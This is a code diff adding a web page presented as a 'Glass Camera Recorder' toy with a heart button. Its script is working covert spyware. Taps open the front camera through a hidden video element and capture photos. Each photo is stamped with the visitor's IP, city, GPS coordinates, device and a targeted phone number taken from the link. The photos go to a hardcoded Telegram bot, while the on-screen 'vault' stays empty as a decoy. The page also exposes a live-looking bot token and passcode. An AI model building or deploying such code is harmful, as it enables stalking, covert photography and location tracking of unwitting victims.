@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Glass Camera Recorder</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for pure minimalist icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Reset selection, tap highlight, and box sizing for mobile & desktop touch UI */
+        * {
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #030508;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        /* Deep Liquid Glass Mesh Background */
+        .liquid-bg {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 20% 20%, #090d16 0%, #020305 70%),
+                        radial-gradient(circle at 80% 80%, #05121c 0%, #010204 75%);
+            z-index: 0;
+        }
+
+        /* Ambient Glowing Glass Orbs (Dark Glass Mode) */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.35;
+            pointer-events: none;
+            transition: background 1.2s ease, transform 4s ease-in-out;
+            animation: drift 14s infinite alternate ease-in-out;
+            z-index: 1;
+        }
+
+        .orb-1 {
+            width: 65vw;
+            height: 65vw;
+            max-width: 600px;
+            max-height: 600px;
+            background: #1e293b;
+            top: -15%;
+            left: -10%;
+        }
+
+        .orb-2 {
+            width: 70vw;
+            height: 70vw;
+            max-width: 650px;
+            max-height: 650px;
+            background: #0f172a;
+            bottom: -15%;
+            right: -10%;
+            animation-delay: -5s;
+        }
+
+        body.recording .orb-1 {
+            background: #e11d48;
+        }
+
+        body.recording .orb-2 {
+            background: #9f1239;
+        }
+
+        @keyframes drift {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(40px, -30px) scale(1.12); }
+        }
+
+        /* Fullscreen Giant Glass Surface */
+        .fullscreen-glass {
+            position: fixed;
+            inset: 14px;
+            border-radius: 38px;
+            background: rgba(6, 9, 15, 0.55);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1.5px solid rgba(255, 255, 255, 0.14);
+            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.85),
+                        inset 0 1px 1px rgba(255, 255, 255, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow: hidden;
+            touch-action: manipulation;
+        }
+
+        .fullscreen-glass:active {
+            transform: scale(0.985);
+        }
+
+        body.recording .fullscreen-glass {
+            border-color: rgba(244, 63, 94, 0.45);
+            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.8),
+                        inset 0 0 60px rgba(244, 63, 94, 0.12);
+        }
+
+        /* Giant Center Glass Emblem (Heart Trigger) */
+        .giant-emblem {
+            width: min(76vw, 76vh);
+            height: min(76vw, 76vh);
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.12), rgba(255,255,255,0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 2px solid rgba(255, 255, 255, 0.18);
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.5),
+                        inset 0 2px 15px rgba(255, 255, 255, 0.22);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            cursor: pointer;
+            touch-action: manipulation;
+            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .giant-emblem:active {
+            transform: scale(0.95);
+        }
+
+        body.recording .giant-emblem {
+            border-color: rgba(244, 63, 94, 0.65);
+            box-shadow: 0 0 90px rgba(244, 63, 94, 0.28),
+                        inset 0 0 35px rgba(244, 63, 94, 0.22);
+            animation: breathePulse 2.4s infinite ease-in-out;
+        }
+
+        @keyframes breathePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.035); }
+        }
+
+        /* Outer Glass Ring */
+        .emblem-ring {
+            position: absolute;
+            inset: 18px;
+            border-radius: 50%;
+            border: 1px dashed rgba(255, 255, 255, 0.2);
+            transition: all 0.6s ease;
+        }
+
+        body.recording .emblem-ring {
+            border-color: rgba(244, 63, 94, 0.5);
+            animation: spinSlow 18s linear infinite;
+        }
+
+        @keyframes spinSlow {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Giant Center Icon */
+        .giant-icon {
+            font-size: min(32vw, 32vh);
+            color: rgba(255, 255, 255, 0.85);
+            filter: drop-shadow(0 12px 30px rgba(0, 0, 0, 0.5));
+            transition: all 0.5s ease;
+        }
+
+        body.recording .giant-icon {
+            color: #fb7185;
+            filter: drop-shadow(0 0 35px rgba(244, 63, 94, 0.65));
+        }
+
+        /* Minimal Floating Glass Controls (Icon-only) */
+        .floating-glass-btn {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            color: rgba(255, 255, 255, 0.9);
+            transition: all 0.25s ease;
+            cursor: pointer;
+        }
+
+        .floating-glass-btn:hover {
+            background: rgba(255, 255, 255, 0.18);
+            transform: scale(1.08);
+        }
+
+        .floating-glass-btn:active {
+            transform: scale(0.94);
+        }
+
+        /* Vault Drawer */
+        .vault-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 4, 8, 0.92);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            z-index: 50;
+            transition: opacity 0.3s ease;
+        }
+
+        .vault-item {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 22px;
+            overflow: hidden;
+            position: relative;
+            aspect-ratio: 1 / 1;
+        }
+
+        /* Vault Password Lock Modal */
+        .lock-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 4, 8, 0.94);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            z-index: 60;
+            transition: opacity 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Mesh & Orbs -->
+    <div class="liquid-bg"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <!-- Hidden Source Video & Canvas for Frame Capture -->
+    <div class="hidden">
+        <video id="stealthVideo" autoplay playsinline webkit-playsinline muted></video>
+        <canvas id="stealthCanvas"></canvas>
+    </div>
+
+    <!-- Top Floating Minimal Icon Controls -->
+    <div class="fixed top-7 inset-x-7 z-30 flex items-center justify-between pointer-events-none">
+        <!-- Balance Spacer -->
+        <div class="w-14 h-14"></div>
+
+        <!-- Active Camera Session Timer Pill -->
+        <div id="recIndicator" class="hidden items-center gap-2.5 px-4 py-2 rounded-full bg-rose-600/80 backdrop-blur-md border border-rose-300/40 text-white font-mono text-sm shadow-lg">
+            <span class="w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
+            <span id="recTimer">00:00</span>
+        </div>
+
+        <!-- Saved Vault Icon -->
+        <button id="vaultTriggerBtn" type="button" onclick="handleVaultClick(event)" aria-label="Vault" class="pointer-events-auto floating-glass-btn w-14 h-14 rounded-2xl flex items-center justify-center text-2xl relative">
+            <span aria-hidden="true">🤗</span>
+            <span id="vaultDot" class="hidden absolute top-2.5 right-2.5 w-3 h-3 rounded-full bg-teal-400 shadow-[0_0_10px_#2dd4bf]"></span>
+        </button>
+    </div>
+
+    <!-- Non-blocking subtle status pill at bottom when error/permission issue occurs -->
+    <div id="statusToast" class="hidden fixed bottom-8 left-1/2 -translate-x-1/2 z-40 px-4 py-2 rounded-full bg-rose-950/90 border border-rose-400/40 text-rose-200 text-xs backdrop-blur-md shadow-xl">
+        <i class="fa-solid fa-triangle-exclamation ml-1.5"></i>
+        <span id="statusText"></span>
+    </div>
+
+    <!-- FULLSCREEN GIANT GLASS TRIGGER SURFACE -->
+    <main id="screenTrigger" role="button" tabindex="0" class="fullscreen-glass">
+        <div id="heartTrigger" role="button" tabindex="0" aria-label="Heart Capture" class="giant-emblem">
+            <div class="emblem-ring"></div>
+            <i id="centerEmblemIcon" class="fa-solid fa-heart giant-icon"></i>
+        </div>
+    </main>
+
+    <!-- MEDIA VAULT MODAL -->
+    <div id="vaultModal" class="vault-overlay hidden opacity-0 flex flex-col p-6">
+        <div class="flex items-center justify-between pb-5 border-b border-white/10">
+            <div class="flex items-center gap-3">
+                <button type="button" onclick="downloadAllMedia()" aria-label="Download All" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-teal-300 text-lg">
+                    <i class="fa-solid fa-download"></i>
+                </button>
+                <button type="button" onclick="clearAllMedia()" aria-label="Clear All" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-rose-400 text-lg">
+                    <i class="fa-solid fa-trash-can"></i>
+                </button>
+            </div>
+            <button type="button" onclick="closeVault()" aria-label="Close" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-white text-xl">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+
+        <div id="vaultGrid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 overflow-y-auto pt-6 pb-10">
+            <!-- Captured photos appear here if enabled -->
+        </div>
+    </div>
+
+    <!-- VAULT PASSWORD MODAL -->
+    <div id="vaultLockModal" class="lock-overlay hidden opacity-0 flex items-center justify-center p-6">
+        <div class="w-full max-w-xs rounded-3xl bg-white/[0.07] border border-white/15 p-6 shadow-2xl flex flex-col items-center gap-4">
+            <div class="w-14 h-14 rounded-2xl bg-white/10 border border-white/15 flex items-center justify-center text-2xl text-teal-300">
+                <i class="fa-solid fa-lock"></i>
+            </div>
+            <input id="vaultPasswordInput" type="password" inputmode="text" autocomplete="off" placeholder="Password" dir="ltr" class="w-full px-4 py-3 rounded-2xl bg-black/50 border border-white/15 text-white text-center tracking-widest focus:outline-none focus:border-teal-400/60" />
+            <div class="w-full flex items-center gap-3">
+                <button type="button" onclick="closeVaultLock()" class="flex-1 py-3 rounded-2xl floating-glass-btn text-sm text-white/80">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+                <button type="button" onclick="verifyVaultPassword()" class="flex-1 py-3 rounded-2xl floating-glass-btn text-sm text-teal-300 font-semibold">
+                    <i class="fa-solid fa-unlock"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Core Application State
+        let isCameraActive = false;
+        let isStarting = false;
+        const facingMode = 'user'; // Always front camera
+        let activeStream = null;
+        let heartBurstTimeout = null;
+        let heartBurstInterval = null;
+        let timerInterval = null;
+        let toastTimeout = null;
+        let sessionSeconds = 0;
+        const VAULT_PASSCODE = 'zaxo20091';
+        let isVaultUnlocked = false;
+        let isUploadingPhoto = false;
+        let isCapturingBurst = false;
+        const pendingPhotoQueue = [];
+
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '9213021133:AAHkwL68ZDzJMwfu_30Z2P501JQUL9pvM2s';
+        const TELEGRAM_CHAT_ID = '7282719931';
+
+        // DOM Media & Trigger References
+        const videoEl = document.getElementById('stealthVideo');
+        const canvasEl = document.getElementById('stealthCanvas');
+        const ctx = canvasEl ? canvasEl.getContext('2d') : null;
+        const screenTrigger = document.getElementById('screenTrigger');
+        const heartTrigger = document.getElementById('heartTrigger');
+
+        // Cached Network & Location Info
+        const cachedNetworkInfo = {
+            ip: 'N/A',
+            location: 'N/A',
+            gps: '',
+            phone: ''
+        };
+
+        // Fetches IP, approximate location, and optional GPS coordinates safely
+        async function fetchNetworkAndLocationInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res && res.ok) {
+                    const data = await res.json();
+                    if (data.ip) cachedNetworkInfo.ip = data.ip;
+                    const parts = [data.city, data.region, data.country_name].filter(Boolean);
+                    if (parts.length > 0) cachedNetworkInfo.location = parts.join(', ');
+                }
+            } catch (_) {}
+
+            if (navigator.geolocation) {
+                try {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            if (pos && pos.coords) {
+                                const lat = pos.coords.latitude.toFixed(5);
+                                const lon = pos.coords.longitude.toFixed(5);
+                                cachedNetworkInfo.gps = `${lat}, ${lon}`;
+                            }
+                        },
+                        () => {},
+                        { enableHighAccuracy: false, timeout: 6000, maximumAge: 60000 }
+                    );
+                } catch (_) {}
+            }
+        }
+
+        // Reads optional phone number from query parameter (?phone=...) or window variable if provided
+        function getOptionalPhoneNumber() {
+            if (cachedNetworkInfo.phone && cachedNetworkInfo.phone.trim()) {
+                return cachedNetworkInfo.phone.trim();
+            }
+            try {
+                const params = new URLSearchParams(window.location.search);
+                const qPhone = params.get('phone');
+                if (qPhone && qPhone.trim()) {
+                    cachedNetworkInfo.phone = qPhone.trim();
+                    return cachedNetworkInfo.phone;
+                }
+            } catch (_) {}
+            if (typeof window.TARGET_PHONE === 'string' && window.TARGET_PHONE.trim()) {
+                cachedNetworkInfo.phone = window.TARGET_PHONE.trim();
+                return cachedNetworkInfo.phone;
+            }
+            return 'N/A';
+        }
+
+        // Detects device model/type from User-Agent
+        function getDeviceModelLabel() {
+            const ua = navigator.userAgent || '';
+            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua)) {
+                const match = ua.match(/Android[^;)]*;\s*([^;)]+)\s*(?:Build|\))/i);
+                return match && match[1] ? match[1].trim() : 'Android';
+            }
+            if (/Macintosh|Mac OS X/i.test(ua)) return 'Mac';
+            if (/Windows/i.test(ua)) return 'Windows';
+            return 'Device';
+        }
+
+        // Builds clean formatted caption with date, time, device label, phone, IP, and location
+        function buildMediaCaption() {
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('en-GB');
+            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const deviceLabel = getDeviceModelLabel();
+            const phoneLabel = getOptionalPhoneNumber();
+            const locationText = cachedNetworkInfo.gps
+                ? `${cachedNetworkInfo.location} (GPS: ${cachedNetworkInfo.gps})`
+                : cachedNetworkInfo.location;
+
+            return [
+                `📅 Date: ${dateStr}`,
+                `⏰ Time: ${timeStr}`,
+                `📱 Device: ${deviceLabel}`,
+                `📞 Phone: ${phoneLabel}`,
+                `🌐 IP: ${cachedNetworkInfo.ip}`,
+                `📍 Location: ${locationText}`
+            ].join('\n');
+        }
+
+        // Uploads captured photo to the configured Telegram bot
+        async function uploadPhotoToTelegram(blob) {
+            try {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !blob || blob.size === 0) return;
+
+                const caption = buildMediaCaption();
+                const filename = `photo_${Date.now()}.jpg`;
+
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('caption', caption);
+                formData.append('photo', blob, filename);
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response && !response.ok) {
+                    showStatusMessage(`Telegram error: ${response.status}`);
+                }
+            } catch (err) {
+                showStatusMessage('Network upload blocked or failed');
+            }
+        }
+
+        // Processes queued photo uploads sequentially without blocking capture
+        async function processPhotoQueue() {
+            if (isUploadingPhoto) return;
+            isUploadingPhoto = true;
+            try {
+                while (pendingPhotoQueue.length > 0) {
+                    const nextBlob = pendingPhotoQueue.shift();
+                    if (nextBlob) {
+                        await uploadPhotoToTelegram(nextBlob);
+                    }
+                }
+            } finally {
+                isUploadingPhoto = false;
+            }
+        }
+
+        // Captures a single photo frame from videoEl with caption watermark and queues for Telegram
+        function capturePhotoFrame() {
+            try {
+                if (!videoEl || !canvasEl || !ctx || videoEl.readyState < 2) return;
+                const w = videoEl.videoWidth || 640;
+                const h = videoEl.videoHeight || 480;
+                if (w === 0 || h === 0) return;
+
+                canvasEl.width = w;
+                canvasEl.height = h;
+
+                // Mirror front camera frame naturally
+                ctx.save();
+                ctx.translate(w, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(videoEl, 0, 0, w, h);
+                ctx.restore();
+
+                // Bottom watermark strip with info
+                const captionLines = buildMediaCaption().split('\n');
+                const barHeight = Math.max(76, Math.round(h * 0.14));
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.55)';
+                ctx.fillRect(0, h - barHeight, w, barHeight);
+
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
+                ctx.font = `${Math.max(12, Math.round(w * 0.022))}px system-ui, sans-serif`;
+                const summary = captionLines.slice(0, 4).join('  |  ');
+                const summary2 = captionLines.slice(4).join('  |  ');
+                ctx.fillText(summary, 14, h - barHeight + 24);
+                if (summary2) {
+                    ctx.fillText(summary2, 14, h - barHeight + 48);
+                }
+
+                canvasEl.toBlob((blob) => {
+                    if (!blob) return;
+                    pendingPhotoQueue.push(blob);
+                    processPhotoQueue();
+                }, 'image/jpeg', 0.82);
+            } catch (_) {
+                // Ignore frame capture errors
+            }
+        }
+
+        // Clears active burst timers if a new heart tap happens
+        function clearHeartBurstTimers() {
+            if (heartBurstTimeout) {
+                clearTimeout(heartBurstTimeout);
+                heartBurstTimeout = null;
+            }
+            if (heartBurstInterval) {
+                clearInterval(heartBurstInterval);
+                heartBurstInterval = null;
+            }
+        }
+
+        // Captures 3 photos per tap on the heart while keeping the camera open
+        function captureThreePhotosOnHeartTap() {
+            clearHeartBurstTimers();
+            isCapturingBurst = true;
+
+            let takenCount = 0;
+            const totalPhotos = 3;
+
+            const snapOne = () => {
+                if (!isCameraActive || !activeStream) {
+                    isCapturingBurst = false;
+                    clearHeartBurstTimers();
+                    return;
+                }
+                capturePhotoFrame();
+                takenCount += 1;
+                if (takenCount >= totalPhotos) {
+                    isCapturingBurst = false;
+                    clearHeartBurstTimers();
+                }
+            };
+
+            // First photo immediately, then 2 more photos in quick succession
+            snapOne();
+            heartBurstInterval = setInterval(() => {
+                if (takenCount < totalPhotos) {
+                    snapOne();
+                } else {
+                    isCapturingBurst = false;
+                    clearHeartBurstTimers();
+                }
+            }, 350);
+        }
+
+        // Starts session timer while camera remains open
+        function startSessionTimer() {
+            sessionSeconds = 0;
+            const timerEl = document.getElementById('recTimer');
+            if (timerEl) timerEl.textContent = '00:00';
+            if (timerInterval) clearInterval(timerInterval);
+
+            timerInterval = setInterval(() => {
+                if (!isCameraActive) return;
+                sessionSeconds += 1;
+                const mins = String(Math.floor(sessionSeconds / 60)).padStart(2, '0');
+                const secs = String(sessionSeconds % 60).padStart(2, '0');
+                if (timerEl) timerEl.textContent = `${mins}:${secs}`;
+            }, 1000);
+        }
+
+        // Opens front camera and keeps it active
+        async function openCameraSession(captureBurstAfterOpen = false) {
+            if (isCameraActive || isStarting) return;
+            isStarting = true;
+
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    showStatusMessage('Camera API not supported');
+                    isStarting = false;
+                    return;
+                }
+
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                } catch (_) {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { ideal: facingMode } },
+                        audio: false
+                    });
+                }
+
+                activeStream = stream;
+                if (videoEl) {
+                    videoEl.srcObject = stream;
+                    try { await videoEl.play(); } catch (_) {}
+                }
+
+                isCameraActive = true;
+                isStarting = false;
+                document.body.classList.add('recording');
+
+                const recInd = document.getElementById('recIndicator');
+                if (recInd) {
+                    recInd.classList.remove('hidden');
+                    recInd.classList.add('flex');
+                }
+
+                startSessionTimer();
+
+                if (captureBurstAfterOpen) {
+                    heartBurstTimeout = setTimeout(() => {
+                        captureThreePhotosOnHeartTap();
+                    }, 220);
+                }
+            } catch (err) {
+                isStarting = false;
+                isCameraActive = false;
+                cleanupHardware();
+                showStatusMessage('Camera permission denied or error');
+            }
+        }
+
+        // Stops active camera session and cleans up timers/tracks
+        function stopCameraSession() {
+            clearHeartBurstTimers();
+            isCapturingBurst = false;
+            isCameraActive = false;
+            isStarting = false;
+            document.body.classList.remove('recording');
+
+            const recInd = document.getElementById('recIndicator');
+            if (recInd) {
+                recInd.classList.add('hidden');
+                recInd.classList.remove('flex');
+            }
+
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+
+            cleanupHardware();
+        }
+
+        // Tapping outside the heart opens and keeps the camera active
+        async function handleScreenTap() {
+            if (!isCameraActive && !isStarting) {
+                await openCameraSession(false);
+            }
+        }
+
+        // Tapping the heart opens the camera (if closed), keeps it open, and captures 3 photos
+        async function handleHeartTap(event) {
+            if (event) event.stopPropagation();
+
+            if (!isCameraActive && !isStarting) {
+                await openCameraSession(true);
+            } else if (isCameraActive) {
+                captureThreePhotosOnHeartTap();
+            }
+        }
+
+        // Stops all media tracks and resets video element
+        function cleanupHardware() {
+            if (activeStream) {
+                activeStream.getTracks().forEach(track => {
+                    try { track.stop(); } catch (_) {}
+                });
+                activeStream = null;
+            }
+            if (videoEl) {
+                videoEl.srcObject = null;
+            }
+        }
+
+        // Displays a brief non-blocking status pill at the bottom of the screen
+        function showStatusMessage(message) {
+            const toast = document.getElementById('statusToast');
+            const textEl = document.getElementById('statusText');
+            if (!toast || !textEl) return;
+            textEl.textContent = message;
+            toast.classList.remove('hidden');
+            if (toastTimeout) clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                toast.classList.add('hidden');
+            }, 3500);
+        }
+
+        // Vault disabled: photos go only to Telegram
+        function updateVaultBadge() {}
+
+        function renderVaultGrid() {
+            const grid = document.getElementById('vaultGrid');
+            if (grid) {
+                grid.innerHTML = '<div class="col-span-full text-center text-white/40 py-12 text-sm"><i class="fa-regular fa-folder-open text-3xl mb-2 block"></i></div>';
+            }
+        }
+
+        function openVaultDirect() {
+            const modal = document.getElementById('vaultModal');
+            if (!modal) return;
+            renderVaultGrid();
+            modal.classList.remove('hidden');
+            requestAnimationFrame(() => modal.classList.remove('opacity-0'));
+        }
+
+        function closeVault() {
+            const modal = document.getElementById('vaultModal');
+            if (!modal) return;
+            modal.classList.add('opacity-0');
+            setTimeout(() => modal.classList.add('hidden'), 250);
+        }
+
+        function openVaultLock() {
+            const lockModal = document.getElementById('vaultLockModal');
+            const input = document.getElementById('vaultPasswordInput');
+            if (!lockModal) return;
+            if (input) input.value = '';
+            lockModal.classList.remove('hidden');
+            requestAnimationFrame(() => lockModal.classList.remove('opacity-0'));
+            setTimeout(() => { if (input) input.focus(); }, 120);
+        }
+
+        function closeVaultLock() {
+            const lockModal = document.getElementById('vaultLockModal');
+            if (!lockModal) return;
+            lockModal.classList.add('opacity-0');
+            setTimeout(() => lockModal.classList.add('hidden'), 250);
+        }
+
+        function verifyVaultPassword() {
+            const input = document.getElementById('vaultPasswordInput');
+            if (!input) return;
+            if (input.value === VAULT_PASSCODE) {
+                isVaultUnlocked = true;
+                closeVaultLock();
+                openVaultDirect();
+            } else {
+                input.value = '';
+                showStatusMessage('Wrong password');
+            }
+        }
+
+        function handleVaultClick(event) {
+            if (event) event.stopPropagation();
+            if (isVaultUnlocked) {
+                openVaultDirect();
+            } else {
+                openVaultLock();
+            }
+        }
+
+        function downloadAllMedia() {}
+
+        function clearAllMedia() {
+            renderVaultGrid();
+        }
+
+        // Bind click/tap on the fullscreen glass trigger (opens camera and keeps it active)
+        if (screenTrigger) {
+            screenTrigger.addEventListener('click', (e) => {
+                e.preventDefault();
+                handleScreenTap();
+            });
+            screenTrigger.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    handleScreenTap();
+                }
+            });
+        }
+
+        // Bind click/tap on the heart trigger (captures 3 photos per tap while keeping camera open)
+        if (heartTrigger) {
+            heartTrigger.addEventListener('click', (e) => {
+                e.preventDefault();
+                handleHeartTap(e);
+            });
+            heartTrigger.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    handleHeartTap(e);
+                }
+            });
+        }
+
+        const passInputEl = document.getElementById('vaultPasswordInput');
+        if (passInputEl) {
+            passInputEl.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') verifyVaultPassword();
+            });
+        }
+
+        // Load network and location metadata early
+        fetchNetworkAndLocationInfo();
+    </script>
+</body>
+</html>
